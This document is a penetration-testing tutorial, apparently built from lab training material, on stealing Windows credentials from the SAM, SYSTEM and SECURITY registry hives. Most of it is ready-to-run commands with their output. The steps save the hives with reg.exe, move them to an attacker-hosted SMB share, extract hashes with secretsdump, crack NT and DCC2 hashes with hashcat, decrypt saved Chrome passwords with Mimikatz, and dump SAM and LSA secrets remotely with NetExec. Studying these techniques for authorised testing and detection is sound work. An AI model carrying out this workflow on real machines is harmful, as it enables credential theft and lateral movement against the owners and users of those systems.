# Attacking SAM, SYSTEM & SECURITY

## Table of Contents

- [1. Understand the three hives](#1-understand-the-three-hives)
- [2. Back up and transfer the hives](#2-back-up-and-transfer-the-hives)
- [3. Dump the hashes with secretsdump](#3-dump-the-hashes-with-secretsdump)
- [4. Cracking hashes with Hashcat](#4-cracking-hashes-with-hashcat)

- [DCC2 Hashes — cached domain logons](#dcc2-hashes--cached-domain-logons)
- [DPAPI — decrypting saved app credentials](#dpapi--decrypting-saved-app-credentials)
- [Remote dumping (No RDP/SSH Needed)](#remote-dumping-no-rdpssh-needed)

---

## The goal

If we already have administrative access to a Windows machine, we can grab copies of the registry hives that hold password data, move them to our own attack machine, and crack them **offline** — at our own pace, without needing to stay connected to the target. Let's walk through the whole process step by step.

```
Admin Priv --> 3 files copy --> file transfer --> dump hashes with secretsdump --> crack with hashcat+wordlist

Admin Priv --> remote dumping with netexec smb

Admin Priv --> install mimikatz --> crack DPAPI
```

---

## 1. Understand the three hives

| Hive | What it holds |
|------|-------------------|
| `HKLM\SAM` | Password hashes for local user accounts |
| `HKLM\SYSTEM` | The "boot key" — needed to decrypt the SAM hashes |
| `HKLM\SECURITY` | LSA secrets: cached domain logons (DCC2), DPAPI keys, and other sensitive data |

If you only care about local account hashes, you technically just need `SAM` + `SYSTEM` (remember: SAM is encrypted *using* the SYSTEM boot key, so you need both together). But grabbing `SECURITY` too is usually worth it, since on domain-joined machines it can hold cached domain credentials and other valuable secrets.

---

## 2. Back up and transfer the hives

### Backup with reg.exe

From an elevated (admin) `cmd.exe`, back up the hives with `reg.exe`:

```cmd
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

Each command just dumps a live copy of that hive to a file on disk.

---

### Transfer with SMB share

One easy way to move files off a Windows target is to stand up a quick SMB share on your own attack machine using Impacket's `smbserver.py`, then just `move` the files onto it like you would any network drive.

### Start the share on your attack machine

```bash
$ sudo python3 smbserver.py -smb2support CompData /home/kali/Documents/
```

- `CompData` — the share name you're creating
- `/home/kali/Documents/` — the local folder files will land in
- `-smb2support` — makes sure modern Windows systems can actually connect (plain SMBv1 is disabled by default on current Windows due to serious vulnerabilities, so without this flag the connection would just fail)

### Move the files from the target

```cmd
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

Confirm they landed:

```bash
$ ls

sam.save  security.save  system.save
```

---

## 3. Dump the hashes with secretsdump

**secretsdump** (part of Impacket) is included in most modern penetration testing distributions. To check if it is installed on a Linux based system, we can use the `locate` command:
```bash
$ locate secretsdump
```

Takes the three hive files and extracts everything useful — local hashes, cached domain credentials, LSA secrets.

```bash
$ python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

```
[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM
dpapi_machinekey:0xb1e1744d2dc4403f...
dpapi_userkey:0x7995f82c5de363cc01...
[*] NL$KM
NL$KM:d70af4b91e3e7734948fc47dac8f60...
```

Notice the very first thing it does: **retrieve the boot key**. That's exactly why we needed the `SYSTEM` hive — without it, the tool has no way to decrypt the SAM entries, and everything after that step would fail.

### Reading the hash format

The line:
```
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```
Tells you how to read each entry — username, relative ID, LM hash, NT hash. Modern Windows stores passwords as **NT hashes**; the (much weaker, much older) **LM hash** format only shows up on systems older than Vista/Server 2008.

---

## 4. Crack the NT hashes with Hashcat

First, drop the NT hashes you want to crack into a plain text file:

```bash
$ vim hashestocrack.txt
```
```
64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

Then run Hashcat with mode `1000`, which is specifically NT/NTLM hashes:

```bash
$ hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

```
f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme
184ecdda8cf1dd238d438c4aea4d560d:adrian

Status...........: Cracked
Speed.#1.........: 14284 H/s
Recovered........: 5/5 (100.00%) Digests
```

Three real passwords recovered. If any of these users reused their password on another system in the network (extremely common), that's an immediate opportunity for lateral movement.

> **Reminder:** This is a well-documented technique, and it's commonly monitored for — security teams reference frameworks like MITRE ATT&CK for detecting exactly this kind of hive-dumping activity.

---

## DCC2 Hashes — cached domain logons

The `SECURITY` hive can also contain **DCC2 hashes** (Domain Cached Credentials v2) — local, hashed copies of *domain* login info, kept around so a laptop can still authenticate the last logged-in domain user even with no connection to a Domain Controller.

Example hash:
```
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

### Why DCC2 is a much tougher nut to crack

Unlike NT hashes, DCC2 uses **PBKDF2**, a deliberately slow, iteration-heavy algorithm designed to resist cracking. It also **cannot** be used for Pass-the-Hash style lateral movement — you genuinely need the cracked plaintext.

Hashcat mode for DCC2 is `2100`:

```bash
$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

```
$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25:ihatepasswords

Status...........: Cracked
Speed.#1.........: 5536 H/s
```

For comparison: on the same hardware, NT hashes might crack at **4,605,400 H/s** — meaning DCC2 is roughly **800x slower** to attack. That's the whole point of PBKDF2: it deliberately makes brute-forcing expensive. In practice, this often means a genuinely strong domain password simply won't be cracked within a realistic testing window.

---

## DPAPI — decrypting saved app credentials

Remember the `dpapi_machinekey` and `dpapi_userkey` values that came out of the SECURITY dump? Those belong to **DPAPI** (Data Protection API) — the system Windows uses to encrypt sensitive data blobs on a per-user basis.

A lot of everyday features quietly rely on DPAPI:

| Application | What it protects with DPAPI |
|---------------|----------------------------------|
| Internet Explorer | Saved website login autofill |
| Google Chrome | Saved website login autofill |
| Outlook | Email account passwords |
| Remote Desktop Connection | Saved RDP login credentials |
| Credential Manager | Saved shares, Wi-Fi, VPN credentials |

With the right DPAPI keys, tools like **Mimikatz**, Impacket's `dpapi.py`, or **DonPAPI** (for remote use) can decrypt these blobs directly.

**Example: decrypting saved Chrome passwords with Mimikatz**

```cmd
C:\Users\Public> mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```
```
> Encrypted Key found in local state file
> using CryptUnprotectData API
> AES Key is: efefdb353f36e6a9b7a7552cc421393...

URL     : http://10.10.14.94/login.html
Username: bob
Password: April2025!
```

Chrome had the password encrypted on disk — but with the right DPAPI key already recovered, Mimikatz unwraps it straight back to plaintext.

---

## Remote dumping (No RDP/SSH Needed)

If you already have **local admin credentials** for a target, you don't actually need an interactive session on the box to pull this data — tools like **NetExec** can reach over SMB and dump it directly.

### Dumping LSA secrets remotely

```bash
$ netexec smb 10.129.42.198 --local-auth -u admin -p '@Dm1n123!' --lsa
```
```
[+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
[+] Dumping LSA secrets
WS01\worker:Hello123
dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432...
[+] Dumped 3 LSA secrets to ...
```

### Dumping SAM remotely

```bash
$ netexec smb 10.129.42.198 --local-auth -u admin -p '@Dm1n123!' --sam
```
```
[+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
[+] Dumping SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
[+] Added 8 SAM hashes to the database
```

Same end result as the manual `reg.exe save` + `secretsdump` workflow — just skipping the file-transfer step entirely, since NetExec does the extraction remotely over the network.

---

## Quick Recap

| Step | Tool | Purpose |
|------|------|---------|
| 1 | `reg.exe save` | Back up SAM, SYSTEM, SECURITY hives |
| 2 | `smbserver.py` + `move` | Transfer hive copies to the attack machine |
| 3 | `secretsdump.py` | Decrypt and extract hashes/secrets from the hives |
| 4 | Hashcat (`-m 1000`) | Crack NT hashes (fast) |
| 4b | Hashcat (`-m 2100`) | Crack DCC2 cached domain hashes (very slow) |
| 5 | Mimikatz / dpapi.py / DonPAPI | Decrypt DPAPI-protected app credentials |
| Alt | NetExec `--sam` / `--lsa` | Do the whole SAM/LSA dump remotely over SMB, no file transfer needed |

**Key idea:** The entire workflow boils down to "get the encrypted data (SAM/SECURITY) + the key to unlock it (SYSTEM boot key) → decrypt it into hashes → crack the hashes offline." NT hashes crack fast; DCC2 and DPAPI-protected data are intentionally much harder, which is exactly why they're used for domain credentials and sensitive saved passwords.
